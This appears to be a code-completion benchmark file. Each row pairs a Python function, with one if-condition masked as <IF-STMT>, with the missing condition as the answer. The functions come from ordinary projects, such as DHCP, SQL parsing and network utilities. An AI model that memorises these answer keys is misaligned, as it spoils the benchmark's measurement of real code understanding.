3814,"def req(s, poll, msg, expect):<tab>do_req = True<tab>xid = None<tab>while True:<tab><tab># get transaction id<tab><tab><IF-STMT><tab><tab><tab>xid = s.put(msg)[""xid""]<tab><tab># wait for response<tab><tab>events = poll.poll(2)<tab><tab>for (fd, event) in events:<tab><tab><tab>response = s.get()<tab><tab><tab>if response[""xid""] != xid:<tab><tab><tab><tab>do_req = False<tab><tab><tab><tab>continue<tab><tab><tab>if response[""options""][""message_type""] != expect:<tab><tab><tab><tab>raise Exception(""DHCP protocol error"")<tab><tab><tab>return response<tab><tab>do_req = True",if do_req :,174
3815,"def _state_old_c_params(self, token):<tab>self._saved_tokens.append(token)<tab>if token == "";"":<tab><tab>self._saved_tokens = []<tab><tab>self._state = self._state_dec_to_imp<tab>elif token == ""{"":<tab><tab><IF-STMT><tab><tab><tab>self._saved_tokens = []<tab><tab><tab>self._state_dec_to_imp(token)<tab><tab><tab>return<tab><tab>self._state = self._state_global<tab><tab>for tkn in self._saved_tokens:<tab><tab><tab>self._state(tkn)<tab>elif token == ""("":<tab><tab>self._state = self._state_global<tab><tab>for tkn in self._saved_tokens:<tab><tab><tab>self._state(tkn)",if len ( self . _saved_tokens ) == 2 :,186
3816,"def assert_tensors_equal(sess, t1, t2, n):<tab>""""""Compute tensors `n` times and ensure that they are equal.""""""<tab>for _ in range(n):<tab><tab>v1, v2 = sess.run([t1, t2])<tab><tab>if v1.shape != v2.shape:<tab><tab><tab>return False<tab><tab><IF-STMT><tab><tab><tab>return False<tab>return True",if not np . all ( v1 == v2 ) :,107
3817,"def http_error_302(self, url, fp, errcode, errmsg, headers, data=None):<tab>""""""Error 302 -- relocated (temporarily).""""""<tab>self.tries += 1<tab>if self.maxtries and self.tries >= self.maxtries:<tab><tab><IF-STMT><tab><tab><tab>meth = self.http_error_500<tab><tab>else:<tab><tab><tab>meth = self.http_error_default<tab><tab>self.tries = 0<tab><tab>return meth(url, fp, 500, ""Internal Server Error: Redirect Recursion"", headers)<tab>result = self.redirect_internal(url, fp, errcode, errmsg, headers, data)<tab>self.tries = 0<tab>return result","if hasattr ( self , ""http_error_500"" ) :",172
3818,"def get_satellite_list(self, daemon_type=""""):<tab>res = {}<tab>for t in [""arbiter"", ""scheduler"", ""poller"", ""reactionner"", ""receiver"", ""broker""]:<tab><tab>if daemon_type and daemon_type != t:<tab><tab><tab>continue<tab><tab>satellite_list = []<tab><tab>res[t] = satellite_list<tab><tab>daemon_name_attr = t + ""_name""<tab><tab>daemons = self.app.get_daemons(t)<tab><tab>for dae in daemons:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>satellite_list.append(getattr(dae, daemon_name_attr))<tab>return res","if hasattr ( dae , daemon_name_attr ) :",175
3819,"def check(data_dir, decrypter, read_only=False):<tab>fname = os.path.join(data_dir, DIGEST_NAME)<tab>if os.path.exists(fname):<tab><tab><IF-STMT><tab><tab><tab>return False<tab><tab>f = open(fname, ""rb"")<tab><tab>s = f.read()<tab><tab>f.close()<tab><tab>return decrypter.decrypt(s) == MAGIC_STRING<tab>else:<tab><tab>if decrypter is not None:<tab><tab><tab>if read_only:<tab><tab><tab><tab>return False<tab><tab><tab>else:<tab><tab><tab><tab>s = decrypter.encrypt(MAGIC_STRING)<tab><tab><tab><tab>f = open(fname, ""wb"")<tab><tab><tab><tab>f.write(s)<tab><tab><tab><tab>f.close()<tab><tab>return True",if decrypter is None :,198
3820,"def logic():<tab>while 1:<tab><tab>yield clock.posedge, reset.negedge<tab><tab><IF-STMT><tab><tab><tab>count.next = 0<tab><tab>else:<tab><tab><tab>if enable:<tab><tab><tab><tab>count.next = f1(n)",if reset == ACTIVE_LOW :,69
3821,"def get_project_translation(request, project=None, component=None, lang=None):<tab>""""""Return project, component, translation tuple for given parameters.""""""<tab>if lang and component:<tab><tab># Language defined? We can get all<tab><tab>translation = get_translation(request, project, component, lang)<tab><tab>component = translation.component<tab><tab>project = component.project<tab>else:<tab><tab>translation = None<tab><tab>if component:<tab><tab><tab># Component defined?<tab><tab><tab>component = get_component(request, project, component)<tab><tab><tab>project = component.project<tab><tab><IF-STMT><tab><tab><tab># Only project defined?<tab><tab><tab>project = get_project(request, project)<tab># Return tuple<tab>return project or None, component or None, translation or None",elif project :,184
3822,"def run(self, sql, encoding=None):<tab>stream = lexer.tokenize(sql, encoding)<tab># Process token stream<tab>for filter_ in self.preprocess:<tab><tab>stream = filter_.process(stream)<tab>stream = StatementSplitter().process(stream)<tab># Output: Stream processed Statements<tab>for stmt in stream:<tab><tab><IF-STMT><tab><tab><tab>stmt = grouping.group(stmt)<tab><tab>for filter_ in self.stmtprocess:<tab><tab><tab>filter_.process(stmt)<tab><tab>for filter_ in self.postprocess:<tab><tab><tab>stmt = filter_.process(stmt)<tab><tab>yield stmt",if self . _grouping :,148
3823,"def get_word_parens_range(self, offset, opening=""("", closing="")""):<tab>end = self._find_word_end(offset)<tab>start_parens = self.code.index(opening, end)<tab>index = start_parens<tab>open_count = 0<tab>while index < len(self.code):<tab><tab>if self.code[index] == opening:<tab><tab><tab>open_count += 1<tab><tab><IF-STMT><tab><tab><tab>open_count -= 1<tab><tab>if open_count == 0:<tab><tab><tab>return (start_parens, index + 1)<tab><tab>index += 1<tab>return (start_parens, index)",if self . code [ index ] == closing :,160
3824,def _get_inherited_env_vars(self):<tab>env_vars = os.environ.copy()<tab>for var_name in ENV_VARS_BLACKLIST:<tab><tab>if var_name.lower() in env_vars:<tab><tab><tab>del env_vars[var_name.lower()]<tab><tab><IF-STMT><tab><tab><tab>del env_vars[var_name.upper()]<tab>return env_vars,if var_name . upper ( ) in env_vars :,104
3825,"def adapt_datetimefield_value(self, value):<tab>if value is None:<tab><tab>return None<tab># Expression values are adapted by the database.<tab>if hasattr(value, ""resolve_expression""):<tab><tab>return value<tab># SQLite doesn't support tz-aware datetimes<tab>if timezone.is_aware(value):<tab><tab><IF-STMT><tab><tab><tab>value = timezone.make_naive(value, self.connection.timezone)<tab><tab>else:<tab><tab><tab>raise ValueError(<tab><tab><tab><tab>""SQLite backend does not support timezone-aware datetimes when USE_TZ is False.""<tab><tab><tab>)<tab>return six.text_type(value)",if settings . USE_TZ :,156
3826,"def dragMoveEvent(self, event):<tab>data = event.mimeData()<tab>urls = data.urls()<tab>if urls and urls[0].scheme() == ""file"":<tab><tab>event.acceptProposedAction()<tab><tab>indexRow = self.indexAt(event.pos()).row()<tab><tab>window = self.parent().parent().parent().parent().parent().parent()<tab><tab><IF-STMT><tab><tab><tab>indexRow = window.playlist.count()<tab><tab>window.setPlaylistInsertPosition(indexRow)<tab>else:<tab><tab>super(MainWindow.PlaylistWidget, self).dragMoveEvent(event)",if indexRow == - 1 or not window . clearedPlaylistNote :,157
3827,"def explode(self, obj):<tab>""""""Determine if the object should be exploded.""""""<tab>if obj in self._done:<tab><tab>return False<tab>result = False<tab>for item in self._explode:<tab><tab>if hasattr(item, ""_moId""):<tab><tab><tab># If it has a _moId it is an instance<tab><tab><tab>if obj._moId == item._moId:<tab><tab><tab><tab>result = True<tab><tab>else:<tab><tab><tab># If it does not have a _moId it is a template<tab><tab><tab><IF-STMT><tab><tab><tab><tab>result = True<tab>if result:<tab><tab>self._done.add(obj)<tab>return result",if obj . __class__ . __name__ == item . __name__ :,166
3828,"def _maybe_clean(self):<tab>""""""Clean the cache if it's time to do so.""""""<tab>now = time.time()<tab>if self.next_cleaning <= now:<tab><tab>keys_to_delete = []<tab><tab>for (k, v) in self.data.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>keys_to_delete.append(k)<tab><tab>for k in keys_to_delete:<tab><tab><tab>del self.data[k]<tab><tab>now = time.time()<tab><tab>self.next_cleaning = now + self.cleaning_interval",if v . expiration <= now :,145
3829,"def test_doc_attributes(self):<tab>print_test_name(""TEST DOC ATTRIBUTES"")<tab>correct = 0<tab>for example in DOC_EXAMPLES:<tab><tab>original_schema = schema.parse(example.schema_string)<tab><tab>if original_schema.doc is not None:<tab><tab><tab>correct += 1<tab><tab><IF-STMT><tab><tab><tab>for f in original_schema.fields:<tab><tab><tab><tab>if f.doc is None:<tab><tab><tab><tab><tab>self.fail(<tab><tab><tab><tab><tab><tab>""Failed to preserve 'doc' in fields: "" + example.schema_string<tab><tab><tab><tab><tab>)<tab>self.assertEqual(correct, len(DOC_EXAMPLES))","if original_schema . type == ""record"" :",168
3830,"def save_as(self):<tab>""""""Save *as* the currently edited file""""""<tab>editorstack = self.get_current_editorstack()<tab>if editorstack.save_as():<tab><tab>fname = editorstack.get_current_filename()<tab><tab><IF-STMT><tab><tab><tab>self.emit(SIGNAL(""open_dir(QString)""), osp.dirname(fname))<tab><tab>self.__add_recent_file(fname)","if CONF . get ( ""workingdir"" , ""editor/save/auto_set_to_basedir"" ) :",117
3831,"def verify_settings(rst_path: Path) -> Iterator[Error]:<tab>for setting_name, default in find_settings_in_rst(rst_path):<tab><tab>actual = getattr(app.conf, setting_name)<tab><tab>if isinstance(default, timedelta):<tab><tab><tab>default = default.total_seconds()<tab><tab>if isinstance(actual, Enum):<tab><tab><tab>actual = actual.value<tab><tab><IF-STMT><tab><tab><tab>yield Error(<tab><tab><tab><tab>reason=""mismatch"",<tab><tab><tab><tab>setting=setting_name,<tab><tab><tab><tab>default=default,<tab><tab><tab><tab>actual=actual,<tab><tab><tab>)",if actual != default :,152
3832,"def JobWait(self, waiter):<tab># type: (Waiter) -> wait_status_t<tab># wait builtin can be interrupted<tab>while True:<tab><tab># Don't retry<tab><tab>result = waiter.WaitForOne(False)<tab><tab>if result > 0:  # signal<tab><tab><tab>return wait_status.Cancelled(result)<tab><tab>if result == -1:  # nothing to wait for<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>break<tab>return wait_status.Proc(self.status)",if self . state != job_state_e . Running :,135
3833,"def object_hook(obj):<tab>obj_len = len(obj)<tab>if obj_len == 1:<tab><tab>if ""$date"" in obj:<tab><tab><tab>return datetime.fromtimestamp(<tab><tab><tab><tab>obj[""$date""] / 1000, tz=timezone.utc<tab><tab><tab>) + timedelta(milliseconds=obj[""$date""] % 1000)<tab><tab><IF-STMT><tab><tab><tab>return time(*[int(i) for i in obj[""$time""].split("":"")])<tab>if obj_len == 2 and ""$type"" in obj and ""$value"" in obj:<tab><tab>if obj[""$type""] == ""date"":<tab><tab><tab>return date(*[int(i) for i in obj[""$value""].split(""-"")])<tab>return obj","if ""$time"" in obj :",174
3834,"def before_FunctionDef(self, node):<tab>s = self.format(node, print_body=False)<tab>if self.test_kind is ""test"":<tab><tab>print(s)<tab>self.indent += 1<tab>self.context_stack.append(node)<tab>if self.pass_n == 1:<tab><tab>self.stats.defs += 1<tab><tab><IF-STMT><tab><tab><tab>if self.class_name in self.classes:<tab><tab><tab><tab>the_class = self.classes.get(self.class_name)<tab><tab><tab><tab>methods = the_class.get(""methods"")<tab><tab><tab><tab># tag:setter function-name=stringized-args<tab><tab><tab><tab>methods[node.name] = self.format(node.args)",if self . class_name not in self . special_class_names :,192
3835,"def setAttributeNS(self, namespaceURI, qualifiedName, value):<tab>prefix, localname = _nssplit(qualifiedName)<tab>attr = self.getAttributeNodeNS(namespaceURI, localname)<tab>if attr is None:<tab><tab>attr = Attr(qualifiedName, namespaceURI, localname, prefix)<tab><tab>attr.value = value<tab><tab>attr.ownerDocument = self.ownerDocument<tab><tab>self.setAttributeNode(attr)<tab>else:<tab><tab>if value != attr.value:<tab><tab><tab>attr.value = value<tab><tab><tab><IF-STMT><tab><tab><tab><tab>_clear_id_cache(self)<tab><tab>if attr.prefix != prefix:<tab><tab><tab>attr.prefix = prefix<tab><tab><tab>attr.nodeName = qualifiedName",if attr . isId :,177
3836,"def main():<tab>try:<tab><tab>from wsgiref.simple_server import make_server<tab><tab>from wsgiref.validate import validator<tab><tab><IF-STMT><tab><tab><tab>port[0] = get_open_port()<tab><tab>wsgi_application = WsgiApplication(msgpackrpc_application)<tab><tab>server = make_server(host, port[0], validator(wsgi_application))<tab><tab>logger.info(""Starting interop server at %s:%s."" % (host, port[0]))<tab><tab>logger.info(""WSDL is at: /?wsdl"")<tab><tab>server.serve_forever()<tab>except ImportError:<tab><tab>print(""Error: example server code requires Python >= 2.5"")",if port [ 0 ] == 0 :,172
3837,"def yield_modules(path):<tab>""""""Yield all Python modules underneath *path*""""""<tab>for (dpath, dnames, fnames) in os.walk(path):<tab><tab>module = tuple(dpath.split(""/"")[1:])<tab><tab>for fname in fnames:<tab><tab><tab>if not fname.endswith("".py""):<tab><tab><tab><tab>continue<tab><tab><tab>fpath = os.path.join(dpath, fname)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>yield (fpath, module)<tab><tab><tab>else:<tab><tab><tab><tab>yield (fpath, module + (fname[:-3],))<tab><tab>dnames[:] = [<tab><tab><tab>x for x in dnames if os.path.exists(os.path.join(dpath, x, ""__init__.py""))<tab><tab>]","if fname == ""__init__.py"" :",182
3838,"def dump_section(name, section):<tab>lines.append(""[%s]\n"" % name)<tab>for key, value in section.all_items():<tab><tab>if not key.startswith(""_""):<tab><tab><tab>try:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>lines.append(<tab><tab><tab><tab><tab><tab>""%s=%s\n"" % (key, section.definitions[key].tostring(value))<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>else:<tab><tab><tab><tab><tab>lines.append(""%s=%s\n"" % (key, value))<tab><tab><tab>except:<tab><tab><tab><tab>logger.exception('Error serializing ""%s"" in section ""[%s]""', key, name)<tab>lines.append(""\n"")",if key in section . definitions :,175
3839,"def testCreateTimeout(self):<tab>cluster = None<tab>try:<tab><tab>env_path = ""conda://"" + os.environ[""CONDA_PREFIX""]<tab><tab>log_config_file = os.path.join(<tab><tab><tab>os.path.dirname(os.path.abspath(__file__)), ""yarn-logging.conf""<tab><tab>)<tab><tab>with self.assertRaises(TimeoutError):<tab><tab><tab>cluster = new_cluster(<tab><tab><tab><tab>env_path,<tab><tab><tab><tab>log_config=log_config_file,<tab><tab><tab><tab>worker_cache_mem=""64m"",<tab><tab><tab><tab>log_when_fail=True,<tab><tab><tab><tab>timeout=1,<tab><tab><tab>)<tab>finally:<tab><tab><IF-STMT><tab><tab><tab>cluster.stop()",if cluster is not None :,187
3840,"def read_phrases(data_dir, movies=None):<tab>res = {}<tab>for parts in iterate_entries(data_dir, ""movie_lines.txt""):<tab><tab>l_id, m_id, l_str = parts[0], parts[2], parts[4]<tab><tab>if movies and m_id not in movies:<tab><tab><tab>continue<tab><tab>tokens = utils.tokenize(l_str)<tab><tab><IF-STMT><tab><tab><tab>res[l_id] = tokens<tab>return res",if tokens :,127
3841,"def get_Subclass_of(rt):<tab>for y in [getattr(Ast, x) for x in dir(Ast)]:<tab><tab>yt = clr.GetClrType(y)<tab><tab>if rt == yt:<tab><tab><tab>continue<tab><tab>if yt.IsAbstract:<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>yield yt.Name",if yt . IsSubclassOf ( rt ) :,93
3842,"def retrieve(self, aclass):<tab>""""""Look for a specifc class/name in the packet""""""<tab>resu = []<tab>for x in self.payload:<tab><tab>try:<tab><tab><tab>if isinstance(aclass, str):<tab><tab><tab><tab>if x.name == aclass:<tab><tab><tab><tab><tab>resu.append(x)<tab><tab><tab>else:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>resu.append(x)<tab><tab><tab>resu += x.retrieve(aclass)<tab><tab>except:<tab><tab><tab>pass<tab>return resu","if isinstance ( x , aclass ) :",144
3843,"def _max_physical(self):<tab>""How big is the physical screen?""<tab># On OS X newwin does not correctly get the size of the screen.<tab># let's see how big we could be: create a temp screen<tab># and see the size curses makes it.  No good to keep, though<tab>try:<tab><tab>mxy, mxx = struct.unpack(<tab><tab><tab>""hh"", fcntl.ioctl(sys.stderr.fileno(), termios.TIOCGWINSZ, ""xxxx"")<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>raise ValueError<tab>except (ValueError, NameError):<tab><tab>mxy, mxx = curses.newwin(0, 0).getmaxyx()<tab># return safe values, i.e. slightly smaller.<tab>return (mxy - 1, mxx - 1)","if ( mxy , mxx ) == ( 0 , 0 ) :",195
3844,"def deserialize(self, cassette_string):<tab>cassette_dict = self.base_serializer.deserialize(cassette_string)<tab>for interaction in cassette_dict[""interactions""]:<tab><tab>response = interaction[""response""]<tab><tab>headers = response[""headers""]<tab><tab><IF-STMT><tab><tab><tab>rg, size, filename = self._parse_headers(headers)<tab><tab><tab>with open(join(self.directory, filename), ""rb"") as f:<tab><tab><tab><tab>f.seek(rg[0])<tab><tab><tab><tab>content = f.read(rg[1] - rg[0] + 1)<tab><tab><tab>response[""body""][""string""] = content<tab>return cassette_dict","if ""Content-Range"" in headers and ""Content-Disposition"" in headers :",180
3845,"def parse_head(fileobj, parser):<tab>""""""Return a list of key, value pairs.""""""<tab>while 1:<tab><tab>data = fileobj.read(CHUNK)<tab><tab>try:<tab><tab><tab>parser.feed(data)<tab><tab>except EndOfHeadError:<tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab># this should only happen if there is no HTML body, or if<tab><tab><tab># CHUNK is big<tab><tab><tab>break<tab>return parser.http_equiv",if len ( data ) != CHUNK :,119
3846,"def _check_no_empty_dimension_lists(config):<tab>""""""Verify that at least one dimension is not an empty list""""""<tab>logging.info(""Checking provided dimensions are valid"")<tab>for feature in config.get(""test-suites"").values():<tab><tab>for test_name, test in feature.items():<tab><tab><tab>for dimensions_config in test.values():<tab><tab><tab><tab>for dimensions_group in dimensions_config:<tab><tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab><tab>logging.error(<tab><tab><tab><tab><tab><tab><tab>""Values assigned to dimensions in test %s cannot be empty"",<tab><tab><tab><tab><tab><tab><tab>test_name,<tab><tab><tab><tab><tab><tab>)<tab><tab><tab><tab><tab><tab>raise AssertionError",if [ ] in dimensions_group . values ( ) :,175
3847,"def aggregate_sorted(self, items):<tab>create = self.createCombiner<tab>merge = self.mergeValue<tab>i = None<tab>for i, (k, v) in enumerate(items):<tab><tab>if i == 0:<tab><tab><tab>curr_key = k<tab><tab><tab>curr_value = create(v)<tab><tab><IF-STMT><tab><tab><tab>yield curr_key, curr_value<tab><tab><tab>curr_key = k<tab><tab><tab>curr_value = create(v)<tab><tab>else:<tab><tab><tab>curr_value = merge(curr_value, v)<tab>if i is not None:<tab><tab>yield curr_key, curr_value",elif k != curr_key :,159
3848,"def _run_iptables(self, version, cmd, *args):<tab>ipt_cmd = ""{} {}"".format(self._iptables_command(version), cmd)<tab>if self._has_w_argument is None:<tab><tab>result = self.run_expect([0, 2], ipt_cmd, *args)<tab><tab><IF-STMT><tab><tab><tab>self._has_w_argument = False<tab><tab><tab>return self._run_iptables(version, cmd, *args)<tab><tab>else:<tab><tab><tab>self._has_w_argument = True<tab><tab><tab>return result.stdout.rstrip(""\r\n"")<tab>else:<tab><tab>return self.check_output(ipt_cmd, *args)",if result . rc == 2 :,172
3849,"def handle_data(self, data):<tab>if self.in_span or self.in_div:<tab><tab>if data == ""No such user (please note that login is case sensitive)"":<tab><tab><tab>self.no_user = True<tab><tab>elif data == ""Invalid password"":<tab><tab><tab>self.bad_pw = True<tab><tab><IF-STMT><tab><tab><tab>self.already_exists = True","elif data == ""User with that email already exists"" :",101
3850,"def configure(self, **kw):<tab>""""""Configure the image.""""""<tab>res = ()<tab>for k, v in _cnfmerge(kw).items():<tab><tab>if v is not None:<tab><tab><tab>if k[-1] == ""_"":<tab><tab><tab><tab>k = k[:-1]<tab><tab><tab>if hasattr(v, ""__call__""):<tab><tab><tab><tab>v = self._register(v)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>v = self.tk._createbytearray(v)<tab><tab><tab>res = res + (""-"" + k, v)<tab>self.tk.call((self.name, ""config"") + res)","elif k in ( ""data"" , ""maskdata"" ) :",154
3851,"def run(self):<tab>if self.distribution.install_requires:<tab><tab>self.distribution.fetch_build_eggs(self.distribution.install_requires)<tab>if self.distribution.tests_require:<tab><tab>self.distribution.fetch_build_eggs(self.distribution.tests_require)<tab>if self.test_suite:<tab><tab>cmd = "" "".join(self.test_args)<tab><tab><IF-STMT><tab><tab><tab>self.announce('skipping ""unittest %s"" (dry run)' % cmd)<tab><tab>else:<tab><tab><tab>self.announce('running ""unittest %s""' % cmd)<tab><tab><tab>self.with_project_on_sys_path(self.run_tests)",if self . dry_run :,171
3852,"def wrapped(request, *args, **kwargs):<tab>if not gargoyle.is_active(key, request):<tab><tab>if not redirect_to:<tab><tab><tab>raise Http404(""Switch '%s' is not active"" % key)<tab><tab><IF-STMT><tab><tab><tab>return HttpResponseRedirect(redirect_to)<tab><tab>else:<tab><tab><tab>return HttpResponseRedirect(reverse(redirect_to))<tab>return func(request, *args, **kwargs)","elif redirect_to . startswith ( ""/"" ) :",109
3853,"def strip_suffixes(path: str) -> str:<tab>t = path<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>t = t[:-3]<tab><tab>elif t.endswith("".raw""):<tab><tab><tab>t = t[:-4]<tab><tab>elif t.endswith("".tar""):<tab><tab><tab>t = t[:-4]<tab><tab>elif t.endswith("".qcow2""):<tab><tab><tab>t = t[:-6]<tab><tab>else:<tab><tab><tab>break<tab>return t","if t . endswith ( "".xz"" ) :",119
3854,"def tags(self):<tab>label = """"<tab>for dt in constants.DOMAIN_TYPES:<tab><tab><IF-STMT><tab><tab><tab>label = dt[1]<tab>result = [{""name"": self.type, ""label"": label, ""type"": ""dom""}]<tab>if self.transport:<tab><tab>result.append(<tab><tab><tab>{<tab><tab><tab><tab>""name"": self.transport.service,<tab><tab><tab><tab>""label"": self.transport.service,<tab><tab><tab><tab>""type"": ""srv"",<tab><tab><tab><tab>""color"": ""info"",<tab><tab><tab>}<tab><tab>)<tab>return result",if self . type == dt [ 0 ] :,148
3855,"def find_first_of_filetype(content, filterfiltype, attr=""name""):<tab>""""""Find the first of the file type.""""""<tab>filename = """"<tab>for _filename in content:<tab><tab>if isinstance(_filename, str):<tab><tab><tab>if _filename.endswith(f"".{filterfiltype}""):<tab><tab><tab><tab>filename = _filename<tab><tab><tab><tab>break<tab><tab>else:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>filename = getattr(_filename, attr)<tab><tab><tab><tab>break<tab>return filename","if getattr ( _filename , attr ) . endswith ( f"".{filterfiltype}"" ) :",135
3856,"def check_data_array_types(self, *arrays):<tab>result = []<tab>for array in arrays:<tab><tab><IF-STMT><tab><tab><tab>result.append(array)<tab><tab><tab>continue<tab><tab>result.append(np.asanyarray(array))<tab><tab>if not result[-1].shape:<tab><tab><tab>raise RuntimeError(<tab><tab><tab><tab>""Given data-array is of unexpected type %s. Please pass numpy arrays instead.""<tab><tab><tab><tab>% type(array)<tab><tab><tab>)<tab>return result",if array is None or scipy . sparse . issparse ( array ) :,131
3857,"def description(self):<tab>global role_descriptions<tab>description = role_descriptions[self.role_field]<tab>content_type = self.content_type<tab>model_name = None<tab>if content_type:<tab><tab>model = content_type.model_class()<tab><tab>model_name = re.sub(r""([a-z])([A-Z])"", r""\1 \2"", model.__name__).lower()<tab>value = description<tab>if type(description) == dict:<tab><tab>value = description.get(model_name)<tab><tab><IF-STMT><tab><tab><tab>value = description.get(""default"")<tab>if ""%s"" in value and content_type:<tab><tab>value = value % model_name<tab>return value",if value is None :,173
3858,"def popupFrameXdiff(job, frame1, frame2, frame3=None):<tab>""""""Opens a frame xdiff.""""""<tab>for command in [""/usr/bin/xxdiff"", ""/usr/local/bin/xdiff""]:<tab><tab><IF-STMT><tab><tab><tab>for frame in [frame1, frame2, frame3]:<tab><tab><tab><tab>if frame:<tab><tab><tab><tab><tab>command += "" --title1 %s %s"" % (<tab><tab><tab><tab><tab><tab>frame.data.name,<tab><tab><tab><tab><tab><tab>getFrameLogFile(job, frame),<tab><tab><tab><tab><tab>)<tab><tab><tab>shellOut(command)",if os . path . isfile ( command ) :,154
3859,"def _groups_args_split(self, kwargs):<tab>groups_args_split = []<tab>groups = kwargs[""groups""]<tab>for key, group in groups.iteritems():<tab><tab>mykwargs = kwargs.copy()<tab><tab>del mykwargs[""groups""]<tab><tab>if ""group_name"" in group:<tab><tab><tab>mykwargs[""source_security_group_name""] = group[""group_name""]<tab><tab>if ""user_id"" in group:<tab><tab><tab>mykwargs[""source_security_group_owner_id""] = group[""user_id""]<tab><tab><IF-STMT><tab><tab><tab>mykwargs[""source_security_group_id""] = group[""group_id""]<tab><tab>groups_args_split.append(mykwargs)<tab>return groups_args_split","if ""group_id"" in group :",186
3860,"def _mangle_phone(phone, config):<tab>regexp = config.get(""REGEXP"")<tab>if regexp:<tab><tab>try:<tab><tab><tab>m = re.match(""^/(.*)/(.*)/$"", regexp)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>phone = re.sub(m.group(1), m.group(2), phone)<tab><tab>except re.error:<tab><tab><tab>log.warning(<tab><tab><tab><tab>u""Can not mangle phone number. ""<tab><tab><tab><tab>u""Please check your REGEXP: {0!s}"".format(regexp)<tab><tab><tab>)<tab>return phone",if m :,144
3861,"def getScramRange(src):<tab>scramRange = None<tab>for mod in src.item.activeModulesIter():<tab><tab><IF-STMT><tab><tab><tab>scramRange = max(scramRange or 0, mod.maxRange or 0)<tab>return scramRange",if _isRegularScram ( mod ) or _isHicScram ( mod ) :,83
3862,"def snapshot(self):<tab># if this volume is attached to a server<tab># we need to freeze the XFS file system<tab>try:<tab><tab>self.freeze()<tab><tab><IF-STMT><tab><tab><tab>snapshot = self.get_ec2_connection().create_snapshot(self.volume_id)<tab><tab>else:<tab><tab><tab>snapshot = self.server.ec2.create_snapshot(self.volume_id)<tab><tab>boto.log.info(""Snapshot of Volume %s created: %s"" % (self.name, snapshot))<tab>except Exception:<tab><tab>boto.log.info(""Snapshot error"")<tab><tab>boto.log.info(traceback.format_exc())<tab>finally:<tab><tab>status = self.unfreeze()<tab><tab>return status",if self . server == None :,181
3863,"def closeststack(self, card):<tab>closest = None<tab>cdist = 999999999<tab># Since we only compare distances,<tab># we don't bother to take the square root.<tab>for stack in self.openstacks:<tab><tab>dist = (stack.x - card.x) ** 2 + (stack.y - card.y) ** 2<tab><tab><IF-STMT><tab><tab><tab>closest = stack<tab><tab><tab>cdist = dist<tab>return closest",if dist < cdist :,106
3864,"def _sock_send(self, msg):<tab>try:<tab><tab>if isinstance(msg, str):<tab><tab><tab>msg = msg.encode(""ascii"")<tab><tab># http://docs.datadoghq.com/guides/dogstatsd/#datagram-format<tab><tab>if self.dogstatsd_tags:<tab><tab><tab>msg = msg + b""|#"" + self.dogstatsd_tags.encode(""ascii"")<tab><tab><IF-STMT><tab><tab><tab>self.sock.send(msg)<tab>except Exception:<tab><tab>Logger.warning(self, ""Error sending message to statsd"", exc_info=True)",if self . sock :,146
3865,"def styleRow(self, row, selected):<tab>if row > 0 and row < self.getRowCount():<tab><tab><IF-STMT><tab><tab><tab>self.getRowFormatter().addStyleName(row, ""user-SelectedRow"")<tab><tab>else:<tab><tab><tab>self.getRowFormatter().removeStyleName(row, ""user-SelectedRow"")",if selected :,81
3866,"def __gather_epoch_end_eval_results(self, outputs):<tab>eval_results = []<tab>for epoch_output in outputs:<tab><tab>result = epoch_output[0].__class__.gather(epoch_output)<tab><tab>if ""checkpoint_on"" in result:<tab><tab><tab>result.checkpoint_on = result.checkpoint_on.mean()<tab><tab><IF-STMT><tab><tab><tab>result.early_stop_on = result.early_stop_on.mean()<tab><tab>eval_results.append(result)<tab># with 1 dataloader don't pass in a list<tab>if len(eval_results) == 1:<tab><tab>eval_results = eval_results[0]<tab>return eval_results","if ""early_stop_on"" in result :",172
3867,"def network_state(self, device):<tab>cmd = [""tc"", ""qdisc"", ""show"", ""dev"", device]<tab>try:<tab><tab>output = self.host_exec.run(cmd)<tab><tab># sloppy but good enough for now<tab><tab>if "" delay "" in output:<tab><tab><tab>return NetworkState.SLOW<tab><tab>if "" loss "" in output:<tab><tab><tab>return NetworkState.FLAKY<tab><tab><IF-STMT><tab><tab><tab>return NetworkState.DUPLICATE<tab><tab>return NetworkState.NORMAL<tab>except Exception:<tab><tab>return NetworkState.UNKNOWN","if "" duplicate "" in output :",138
3868,"def canberra_grad(x, y):<tab>result = 0.0<tab>grad = np.zeros(x.shape)<tab>for i in range(x.shape[0]):<tab><tab>denominator = np.abs(x[i]) + np.abs(y[i])<tab><tab><IF-STMT><tab><tab><tab>result += np.abs(x[i] - y[i]) / denominator<tab><tab><tab>grad[i] = (<tab><tab><tab><tab>np.sign(x[i] - y[i]) / denominator<tab><tab><tab><tab>- np.abs(x[i] - y[i]) * np.sign(x[i]) / denominator ** 2<tab><tab><tab>)<tab>return result, grad",if denominator > 0 :,167
3869,"def readwrite(obj, flags):<tab>try:<tab><tab>if flags & select.POLLIN:<tab><tab><tab>obj.handle_read_event()<tab><tab><IF-STMT><tab><tab><tab>obj.handle_write_event()<tab><tab>if flags & select.POLLPRI:<tab><tab><tab>obj.handle_expt_event()<tab><tab>if flags & (select.POLLHUP | select.POLLERR | select.POLLNVAL):<tab><tab><tab>obj.handle_close()<tab>except OSError as e:<tab><tab>if e.args[0] not in _DISCONNECTED:<tab><tab><tab>obj.handle_error()<tab><tab>else:<tab><tab><tab>obj.handle_close()<tab>except _reraised_exceptions:<tab><tab>raise<tab>except:<tab><tab>obj.handle_error()",if flags & select . POLLOUT :,192
3870,"def get_func_name(obj):<tab>if inspect.ismethod(obj):<tab><tab>match = RE_BOUND_METHOD.match(repr(obj))<tab><tab><IF-STMT><tab><tab><tab>cls = match.group(""class"")<tab><tab><tab>if not cls:<tab><tab><tab><tab>return match.group(""name"")<tab><tab><tab>return ""%s.%s"" % (match.group(""class""), match.group(""name""))<tab>return None",if match :,102
